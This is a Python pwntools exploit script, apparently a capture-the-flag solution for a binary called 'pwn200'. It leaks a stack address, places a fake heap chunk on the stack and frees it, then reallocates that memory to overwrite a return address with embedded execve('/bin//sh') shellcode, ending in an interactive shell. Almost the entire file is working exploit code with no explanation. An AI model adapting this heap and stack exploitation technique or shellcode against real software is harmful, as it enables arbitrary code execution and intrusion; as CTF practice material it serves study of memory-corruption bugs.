#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn200_patched")
libc = ELF("./libc6_2.24-9ubuntu2_amd64.so")
ld = ELF("./ld-2.24.so")

context.binary = exe
context.log_level = 'debug'

bp = [
    #'0x400b2f', #ISCC_main
    #'0x400a87', #hotel
    #'0x400a28'  #return
]

r = process([exe.path])
script = ['b* ' + i for i in bp]
gdb.attach(r, '\n'.join(script))

def ISCC_input(buffer, id):
    r.sendafter(b'who are u?\n', buffer)
    data = r.recvuntil(b', welcome', drop=True)

    r.sendlineafter(b'give me your id ~~?', str(id).encode())
    return data

def hotel_input(buffer):
    r.sendafter(b'give me money~', buffer)

def alloc(size, data):
    r.sendlineafter(b'your choice : ', b'1')
    r.sendlineafter(b'how long?', str(size).encode())
    r.sendafter(b'give me more money : ', data)

def free():
    r.sendlineafter(b'your choice : ', b'2')

shellcode =b'\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05'

def main():

    data = ISCC_input(b'a'*0x30, 0x72)
    rbp = u64(data[0x30:].ljust(8, b'\x00'))
    print(hex(rbp))

    free_location = rbp - 0x7ffff8a3ef10 + 0x7ffff8a3ee60
    payload = flat( #0x40
        p64(0),
        p64(0x60),
        p64(0)*5,
        p64(free_location)
    )
    hotel_input(payload)

    shellcode_location = rbp - 0x7fff47bb3ba0 + 0x7fff47bb3af0
    payload = flat(
        shellcode.ljust(0x38, b'a'),
        shellcode_location
    )
    free()

    alloc(0x50, payload)
    print(hex(len(shellcode)))
    r.interactive()


if __name__ == "__main__":
    main()
